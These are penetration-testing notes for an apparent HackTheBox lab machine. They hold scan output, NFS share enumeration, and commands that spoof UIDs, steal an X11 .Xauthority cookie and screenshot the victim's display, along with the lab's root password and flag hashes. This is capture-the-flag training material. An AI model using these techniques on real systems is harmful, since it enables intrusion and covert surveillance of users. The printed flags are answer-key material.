# BOX NAME:

LINK: squashed@HTB[](https://www.vulnhub.com/entry/kioptrix-2014-5,62/)

### **IP=10.10.11.189**

**URL=http://10.10.11.189**

# Remote Enumeration & Scan-outputs:

### <ins>Host Discovery</ins>

```
[+] 10.10.11.189
```

### <ins>Nmap scan</ins>

```
└─# nmap -n -sS -sC -sV $IP -p-
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 15:38 EST
Nmap scan report for 10.10.11.191
Host is up (0.042s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35045/tcp   mountd
|   100005  1,2,3      40197/tcp6  mountd
|   100005  1,2,3      44772/udp   mountd
|   100005  1,2,3      56743/udp6  mountd
|   100021  1,3,4      39749/udp6  nlockmgr
|   100021  1,3,4      40077/tcp6  nlockmgr
|   100021  1,3,4      44107/tcp   nlockmgr
|   100021  1,3,4      44190/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8000/tcp  open  http     SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
35045/tcp open  mountd   1-3 (RPC #100005)
41829/tcp open  mountd   1-3 (RPC #100005)
44107/tcp open  nlockmgr 1-4 (RPC #100021)
59025/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### <ins>Nikto scan</ins>

```
[+]
```

### <ins>Whatweb scan</ins>

```
└─# whatweb $URL | tr ',' '\n'
http://10.10.11.191 [200 OK] Apache[2.4.41]
 Bootstrap
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]
 IP[10.10.11.191]
 JQuery[3.0.0]
 Script
 Title[Built Better]
 X-UA-Compatible[IE=edge]
```

# Fuzz

### ffuf

```
images                  [Status: 200, Size: 6225, Words: 298, Lines: 43, Duration: 47ms]
icons                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
css                     [Status: 200, Size: 6309, Words: 301, Lines: 42, Duration: 3694ms]
js                      [Status: 200, Size: 2246, Words: 141, Lines: 23, Duration: 4367ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 45ms]
```

### feroxbuster

```
feroxbuster -u $URL -w /base/wordlists/web-fuzz/directory-list-2.3-big.txt -r --dont-scan=css,manual,js,images
```

# Special portfindings:

\[+\] Port 22 \[SSH\]
\[+\] Port 111 \[NFS\]

```
└─# showmount -e $IP
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *

└─# tree ross/*
ross/Desktop
ross/Documents
└── Passwords.kdbx 		#EFFING RABBIT-HOLE
ross/Downloads
ross/Music
ross/Pictures
ross/Public
ross/Templates
ross/Videos
```

# Local Filesystem Findings:

### **FILES OF INTEREST**

```
mount -t nfs $IP:/var/www/html/ html
mount -t nfs $IP:/home/ross ross

ll ross
drwxr-xr-x 14 1001 1001 4096 Jan 19 01:21 .
drwxr-xr-x  4 root root 4096 Jan 19 15:48 ..
lrwxrwxrwx  1 root root    9 Oct 20 09:24 .bash_history -> /dev/null
drwx------ 11 1001 1001 4096 Oct 21 10:57 .cache
drwx------ 12 1001 1001 4096 Oct 21 10:57 .config
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Desktop
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Documents
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Downloads
drwx------  3 1001 1001 4096 Oct 21 10:57 .gnupg
drwx------  3 1001 1001 4096 Oct 21 10:57 .local
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Music
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Pictures
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Public
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Templates
drwxr-xr-x  2 1001 1001 4096 Oct 21 10:57 Videos
lrwxrwxrwx  1 root root    9 Oct 21 09:07 .viminfo -> /dev/null
-rw-------  1 1001 1001   57 Jan 19 01:21 .Xauthority
-rw-------  1 1001 1001 2475 Jan 19 01:21 .xsession-errors
-rw-------  1 1001 1001 2475 Dec 27 10:33 .xsession-errors.old


> ls -ld html
drwxr-xr--  6 2017 www-data    4096 Jan 19 15:50 html
```

**SUID**

```
[+]
```

**SGID**

```
[+]
```

### **Dumps, outputs, other useful information**

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
[+]
```

# Credentials:

```
username:password
```

# Hashes:

```
MD4:
MD5:
SHA1:
SHA512:
```

# Exploits and Payloads:

```
//GID/UID impersonation
useradd ssor -u 1001
useradd fake -u 2017

//steal .Xauthority cookies.
cat /ross/.Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABBwnmKDoPbchgdiswsZhkrK
echo 'AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABBwnmKDoPbchgdiswsZhkrK' | base64 -d /tmp/.Xauthority
export XAUTHORITY=/tmp/.Xauthority
w (find tty)
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
convert screen.xwd screen.png
```

![c8df8136004b185748a81624ec21fb76.png](../../_resources/c8df8136004b185748a81624ec21fb76.png)

# Writeup:

```
>Started with enumeration. Found NFS shares and exploited them.
>Assumed GID and UID to access the html. Placed a rev-shell and got a foothold.
>found nothing <- back to #1
>impersonate ssor -> steal xauthority cookie
>rootpassword $blingbling
```

==PROOFS==

user.txt: 59141fa14195b2b504438bcbd7ae20c8
root.txt: b5a3e0af0c592531950f76edaead7bb8

![0ab016b9086852eb91309e0e3cf44a32.png](../../_resources/0ab016b9086852eb91309e0e3cf44a32.png)